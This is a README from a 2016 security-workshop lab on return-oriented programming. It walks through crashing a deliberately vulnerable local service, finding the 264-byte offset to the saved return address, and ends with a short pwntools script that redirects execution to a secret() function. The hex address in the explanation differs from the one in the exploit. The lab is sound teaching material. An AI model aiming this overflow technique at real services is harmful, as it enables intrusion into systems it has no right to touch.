= README

ROP from Olivier Arteau's April 2016 montrehack session

* https://github.com/montrehack/challenges/tree/master/2016-04-18[Files]
* http://montrehack.ca/2016/04/18/rop-tutorial.html

== WARNING

`rop-example` is exposing your machine. Firewall the service:

    sudo iptables -A INPUT -i wifi0 -m tcp -p tcp --destination-port 1235 -j DROP

== Stage 1 / ROP reminder

Cyclic to generate patterns

    $ cyclic 512

Make process crash

Check overwritten RIP

    info frame
    Stack level 0, frame at 0x7fffffffd8a8:
     rip = 0x400a76 in service; saved rip = 0x6361617263616171
     called by frame at 0x7fffffffd8b8
     Arglist at 0x636161706361616f, args: 
     Locals at 0x636161706361616f, Previous frame's sp is 0x7fffffffd8b0
     Saved registers:
     rip at 0x7fffffffd8a8

Convert saved rip to ascii (be mindfull of endianness)

    In [5]: '\x63\x61\x61\x72\x63\x61\x61\x71'
    Out[5]: 'caarcaaq'

    caaq -> qaac

    $ cyclic -l qaac
    264

After sending 'a' * 264 + 'ABCDEFGHIJKL'

    $ info frame
    Stack level 0, frame at 0x7fffffffd8a8:
    rip = 0x400a76 in service; saved rip = 0x4847464544434241
    called by frame at 0x7fffffffd8b8
    Arglist at 0x6161616161616161, args: 
    Locals at 0x6161616161616161, Previous frame's sp is 0x7fffffffd8b0
    Saved registers:
    rip at 0x7fffffffd8a8

Find address to jump to. The `secret()` function in this example. Encode the
address in little endian.

    struct.pack('<q', 0x0400BD1)

Working exploit:

    r = remote('localhost', 1235, timeout=1)
    r.recvuntil(': ')
    r.send(b'a' * 264 + struct.pack('<q', 0x400BC6) + b'\n')
    print(r.recvline())
